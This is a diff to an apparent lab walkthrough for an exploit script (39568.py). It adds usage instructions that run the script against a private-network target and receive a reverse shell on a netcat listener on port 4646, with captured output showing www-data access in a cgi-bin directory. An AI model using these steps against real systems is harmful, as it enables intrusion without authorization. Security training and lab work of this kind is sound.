@@ -275,9 +275,29 @@ if __name__ == "__main__":
     main()
 ```
 how to run:
- python 39568.py target_ip your_p  4646
+ ```bash
+mrbunny $ python 39568.py 10.80.160.139 192.168.1.78  4646
+[+] Host appears vulnerable! Spawning reverse shell...
+[+] Exploit sent, check your listener!
+
+```
 run a netcat for listening
-nc -lvnp 4646
+```
+bash 
+mrbunny $ nc -lvnp 4646
+Listening on 0.0.0.0 4646
+id
+ls
+Connection received on 10.80.160.139 41063
+bash: cannot set terminal process group (867): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/usr/lib/cgi-bin$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@ubuntu:/usr/lib/cgi-bin$ ls
+test.cgi
+www-data@ubuntu:/usr/lib/cgi-bin$ 
+
+```
 
 
 
